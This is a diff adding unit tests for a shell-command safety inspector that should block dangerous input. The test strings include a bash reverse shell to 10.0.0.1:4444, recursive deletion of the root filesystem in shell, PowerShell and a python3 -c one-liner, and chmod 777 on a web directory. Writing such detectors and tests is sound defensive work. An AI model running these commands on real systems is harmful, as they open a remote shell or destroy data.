@@ -38,3 +38,42 @@ def test_block_reverse_shell():
     res = inspector.inspect("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
     assert res.is_safe is False
     assert any("reverse shell" in r.lower() for r in res.detected_risks)
+
+
+def test_block_rm_split_flags():
+    """Phase 1.4: rm -r -f / (split flags) must be blocked."""
+    inspector = ShellASTInspector()
+    res = inspector.inspect("rm -r -f /")
+    assert res.is_safe is False
+    assert any("rm" in r.lower() or "destructive" in r.lower() for r in res.detected_risks)
+
+
+def test_allow_rm_safe_file():
+    """Phase 1.4: rm -f on a normal workspace file must NOT be flagged."""
+    inspector = ShellASTInspector()
+    res = inspector.inspect("rm -f /workspace/temp/file.txt")
+    assert res.is_safe is True
+
+
+def test_block_chmod_777():
+    """Phase 1.4: chmod 777 must be blocked."""
+    inspector = ShellASTInspector()
+    res = inspector.inspect("chmod 777 /var/www")
+    assert res.is_safe is False
+    assert any("chmod" in r.lower() for r in res.detected_risks)
+
+
+def test_block_powershell_remove_item():
+    """Phase 1.4: PowerShell Remove-Item -Recurse -Force must be blocked."""
+    inspector = ShellASTInspector()
+    res = inspector.inspect("Remove-Item -Recurse -Force C:\\")
+    assert res.is_safe is False
+    assert any("powershell" in r.lower() for r in res.detected_risks)
+
+
+def test_block_python_interpreter():
+    """Phase 1.4: python3 -c invocation must be flagged."""
+    inspector = ShellASTInspector()
+    res = inspector.inspect("python3 -c 'import os; os.system(\"rm -rf /\")'")
+    assert res.is_safe is False
+    assert any("interpreter" in r.lower() for r in res.detected_risks)
